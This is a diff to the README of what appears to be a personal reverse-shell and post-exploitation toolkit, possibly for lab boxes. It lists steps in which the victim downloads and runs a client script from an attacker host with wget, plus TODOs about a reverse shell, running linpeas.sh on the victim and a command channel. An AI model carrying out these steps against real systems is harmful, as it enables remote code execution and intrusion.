@@ -3,9 +3,9 @@
 
 # Steps
 1. (on attacker): python3 http_server.py
-2. (on victim): wget 10.10.14.7:8000/victim_client_10.10.14.7.py
-3. (on attacker): python3 listener.py
-4. (on victim): python3 victim_client_10.10.14.7.py
+2. (on victim): wget <ATTACKER_IP>:8000/victim_client_<ATTACKER_IP>.py
+3. (on attacker): python3 listener.py -v <VICTIM_IP>
+4. (on victim): python3 victim_client_<ATTACKER_IP>.py
 
 # TODO
 - (Medium) Fix simple reverse shell (instead of python victim client) running into EOF error
@@ -25,3 +25,4 @@
 - (Low) Upload and run linpeas.sh, save locally. Make it as part of the menu of things to run.
 - (Low) Some kind of client/server written on python which allows me to send commands to the victim via an encrypted channel and he just run code locally. Implement with as little dependencies as possible (will require at least python3). Since python3 is required, maybe this isn't a great idea. Might as well just send commands to the victim directly via pwntools.
 - (Low) If long running commands aren't working, echo a magic string and run recvuntil that magic string is encountered
+- (Low) Better logging with colors and stuff!
